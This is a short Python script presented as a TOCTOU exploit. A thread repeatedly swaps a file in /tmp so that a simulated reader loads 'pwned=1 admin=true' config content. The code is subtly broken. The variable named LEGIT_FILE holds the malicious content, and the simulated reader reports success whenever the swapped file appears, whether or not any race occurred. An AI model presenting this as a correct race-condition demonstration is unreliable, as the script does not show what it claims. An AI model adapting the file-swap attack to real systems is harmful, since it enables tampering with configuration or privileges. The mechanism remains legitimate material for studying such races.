#!/usr/bin/env python3
# TOCTOU Exploit: File Existence Check â†’ Use Race
# Vulnerable pattern: if os.path.exists("file") then open("file")
# Common in upload validation, config loading, temp file handling

import os
import threading
import time
import random

TARGET_FILE = "/tmp/secret_config"
LEGIT_FILE = "/tmp/public_config"
MALICIOUS_CONTENT = "pwned=1\nadmin=true\n"

def checker():
    """Simulates vulnerable app: checks existence then reads"""
    while True:
        if os.path.exists(TARGET_FILE):
            try:
                with open(TARGET_FILE, 'r') as f:
                    content = f.read()
                    if "pwned" in content:
                        print(f"[!] TOCTOU SUCCESS! App read malicious content: {content.strip()}")
                        break
            except:
                pass
        time.sleep(0.01)

def swapper():
    """Swaps in malicious file during race window"""
    time.sleep(0.5)  # Wait for checker to start
    for i in range(1000):
        # Create legit file
        with open(TARGET_FILE, 'w') as f:
            f.write("safe=true\n")
        
        # Tiny race window
        time.sleep(random.uniform(0.001, 0.01))
        
        # Swap to malicious
        os.replace(LEGIT_FILE, TARGET_FILE)
        
        # Recreate legit for next cycle
        with open(LEGIT_FILE, 'w') as f:
            f.write(MALICIOUS_CONTENT)

# Prepare malicious file
with open(LEGIT_FILE, 'w') as f:
    f.write(MALICIOUS_CONTENT)

print("[*] Starting TOCTOU file existence exploit...")
threading.Thread(target=checker, daemon=True).start()
threading.Thread(target=swapper).start()

# Keep alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Exploit terminated")
